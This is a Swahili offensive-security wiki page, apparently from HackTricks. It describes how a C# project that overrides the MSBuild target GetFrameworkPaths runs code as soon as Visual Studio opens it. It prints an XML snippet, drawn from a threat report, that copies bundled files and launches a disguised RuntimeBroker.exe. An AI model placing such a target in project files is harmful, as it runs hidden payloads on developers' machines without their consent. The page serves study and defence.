# Utekelezaji wa MSBuild wa Wakati wa Usanifu wa Project ya Visual Studio

{{#include ../banners/hacktricks-training.md}}

Kufungua project ya C# katika Visual Studio si kitendo cha kusoma tu. Build ya wakati wa usanifu hutekeleza targets za MSBuild zenye majina maalum ili kuanzisha IntelliSense, references na debugging **kabla** msanidi hajachagua Build au Run. `GetFrameworkPaths` ni mojawapo ya targets hizo. Project inayofafanua upya target hiyo inaweza kufanya upakiaji wa project utekeleze code katika muktadha wa mtumiaji bila kuhitaji kubofya payload kando.<sup>[[1]](#references)[[2]](#references)</sup>

Project iliyoripotiwa ilitangaza resource files, kisha ikatumia `MakeDir`, `Copy` na `Exec` ndani ya target yake mbadala ili kuweka na kuzindua payload iliyowekwa pamoja nayo. Sehemu hii fupi iliyotolewa inahifadhi njia ya utekelezaji iliyoonyeshwa katika Figure 6 ya chanzo; inapaswa kuwekwa ndani ya `.csproj`, si katika faili ya XML inayojitegemea.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Mpangilio wa import ni muhimu:** MSBuild hutumia *ufafanuzi wa mwisho* wa target. Target iliyoandikwa kwenye faili ya project haihakikishiwi kuchukua nafasi ya target ya Microsoft ikiwa import ya baadaye itafafanua upya target hiyo. Projects za mtindo wa SDK zinazotumia `<Project Sdk="...">` hu-import target za SDK moja kwa moja baada ya mwili wa project, kwa hivyo kagua mpangilio wa import uliotathminiwa badala ya kudhani kuwa override hii sahihi itafanya kazi katika kila project. `MSBuild.exe -preprocess:expanded.xml project.csproj` hupanua imports bila kujenga project na inaweza kusaidia kupata ufafanuzi wa target unaotumika.<sup>[[3]](#references)[[4]](#references)</sup>

Hii ni sehemu ya utekelezaji wa project ya developer, si usakinishaji wa kiendelezi cha VSIX, na yenyewe haisababishi privilege escalation. Ikiwa executable iliyowekwa kwenye hatua ya maandalizi inatumia `.exe.config` au DLL hasidi iliyo karibu nayo, endelea na [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Kampeni ya Blinder Tunnel Inalenga Miundombinu ya Iraq](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Ujumuishaji wa Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Targets za MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Marejeleo ya Mstari wa Amri wa MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
